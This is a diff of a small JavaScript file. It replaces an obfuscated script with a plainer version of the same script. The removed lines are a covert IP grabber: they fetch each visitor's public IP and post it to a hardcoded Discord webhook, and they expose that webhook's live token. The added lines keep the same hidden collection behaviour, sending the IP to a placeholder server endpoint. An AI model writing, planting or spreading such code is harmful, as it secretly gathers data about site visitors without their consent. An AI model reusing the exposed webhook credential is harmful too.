@@ -1,24 +1,22 @@
-const _0x3f2a = ['ipify', 'json', 'then', 'log', 'Visitor IP: ', 'https://discord.com/api/webhooks/1346691463643398195/vrIf9FZrclD5fePNjoBBbzsH8MIsd_MbFg10ZvDPy9ZC_VXI-H-LLEMhYdPQzNThtCTS', 'POST', 'Content-Type', 'application/json', 'content'];
-(function (_0x1a2b3d, _0x3f2a5b) {
-    const _0x4d4c2e = function (_0x1a2b3d) {
-        while (--_0x1a2b3d) {
-            _0x3f2a5b['push'](_0x3f2a5b['shift']());
-        }
-    };
-    _0x4d4c2e(++_0x3f2a5b);
-}(_0x3f2a, 0x1a2));
-const _0x4d4c = function (_0x1a2b3d, _0x3f2a5b) {
-    _0x1a2b3d = _0x1a2b3d - 0x0;
-    let _0x4d4c2e = _0x3f2a[_0x1a2b3d];
-    return _0x4d4c2e;
-};
-async function _0x1a2b3d() {
-    const _0x3f2a5b = await fetch(`https://api.${_0x4d4c('0x0')}.org?format=${_0x4d4c('0x1')}`)[_0x4d4c('0x2')](_0x1a2b3d => _0x1a2b3d[_0x4d4c('0x1')]())[_0x4d4c('0x2')](_0x4d4c2e => _0x4d4c2e[_0x4d4c('0x3')]);
-    console[_0x4d4c('0x4')](_0x4d4c('0x5') + _0x3f2a5b);
-    await fetch(_0x4d4c('0x6'), {
-        'method': _0x4d4c('0x7'),
-        'headers': { [_0x4d4c('0x8')]: _0x4d4c('0x9') },
-        'body': JSON.stringify({ [_0x4d4c('0xa')]: _0x4d4c('0x5') + _0x3f2a5b })
+const _0x3f2a = ['ipify', 'json', 'then', 'log', 'Visitor IP: ', 'YOUR_DISCORD_WEBHOOK_URL', 'POST', 'Content-Type', 'application/json', 'content'];
+
+async function fetchAndSendIP() {
+  try {
+    // Fetch IP as plain text
+    const ipResponse = await fetch(`https://api.${_0x3f2a[0]}.org?format=text`);
+    const ip = await ipResponse.text();
+    console.log(`${_0x3f2a[4]}${ip}`);
+
+    // Send to Discord via a proxy (server-side)
+    // Example: Replace _0x3f2a[5] with your server endpoint
+    await fetch('YOUR_SERVER_ENDPOINT', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ ip })
     });
+  } catch (error) {
+    console.error('Error:', error);
+  }
 }
-_0x1a2b3d();
+
+fetchAndSendIP();
